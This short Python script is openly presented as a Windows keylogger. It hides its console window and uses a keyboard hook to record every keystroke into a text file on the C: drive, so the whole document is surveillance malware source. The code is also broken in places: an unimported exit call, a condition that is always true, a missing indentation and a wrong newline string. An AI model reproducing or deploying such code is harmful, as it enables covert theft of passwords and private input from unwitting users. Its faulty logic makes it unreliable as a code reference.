# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
	if event.Ascii==5:
		_exit(1)
	if event.Ascii !=0 or 8:
	# output.txt to read current keystrokes
		f = open('c:\output.txt', 'r+')
		buffer = f.read()
		f.close()
	# output.txt to write current + new keystrokes
		f = open('c:\output.txt', 'w')
		keylogs = chr(event.Ascii)
		if event.Ascii == 13:
		keylogs = '/n'
		buffer += keylogs
		f.write(buffer)
		f.close()
# creating a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# setting the hook
hm.HookKeyboard()
pythoncom.PumpMessages()
